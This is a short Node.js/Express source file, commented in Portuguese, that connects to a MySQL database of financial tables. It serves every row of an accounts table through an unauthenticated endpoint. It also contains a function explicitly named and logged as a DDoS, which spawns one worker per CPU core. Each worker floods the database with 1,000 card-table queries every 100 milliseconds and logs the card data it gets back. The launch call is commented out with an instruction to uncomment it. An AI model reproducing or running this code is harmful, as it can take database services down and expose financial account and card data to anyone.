const express = require('express');
const mysql = require('mysql');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');

const app = express();
const connection = mysql.createConnection({
    host: 'SeuHost',
    user: 'SeuUser',
    password: 'SuaSenha',
    database: 'SeuBD',
    port: 3306 
});

connection.connect((err) => {
    if (err) {
        console.error('Erro ao conectar ao banco de dados:', err);
        return;
    }
    console.log('Conexão bem sucedida ao banco de dados');
});

app.get('/dados', (req, res) => {
    connection.query('SELECT * FROM financial.account', (err, results) => {
        if (err) {
            console.error('Erro ao enviar consulta:', err);
            res.status(500).send('Erro ao buscar dados do banco de dados');
            return;
        }
        res.json(results);
    });
});

function startDDoS() {
    if (isMainThread) {
        const numThreads = require('os').cpus().length;
        console.log(`Iniciando ${numThreads} threads para DDoS`);

        for (let i = 0; i < numThreads; i++) {
            new Worker(__filename, { workerData: { threadId: i } });
        }
    } else {
        const { threadId } = workerData;

        setInterval(() => {
            for (let i = 0; i < 1000; i++) { 
                connection.query('SELECT * FROM financial.card', (err, results) => {
                    if (err) {
                        console.error(`Erro na thread ${threadId} ao enviar consulta:`, err);
                        return;
                    }
                    console.log(`Consulta bem sucedida na thread ${threadId}. Resultados:`, results);
                });
            }
        }, 100); 
    }
}

// Inicia o DDoS (descomente para iniciar)
// startDDoS();

const PORT = process.env.PORT || 8007;


if (isMainThread) {
    app.listen(PORT, () => {
        console.log(`Servidor rodando na porta ${PORT}`);
    });
}
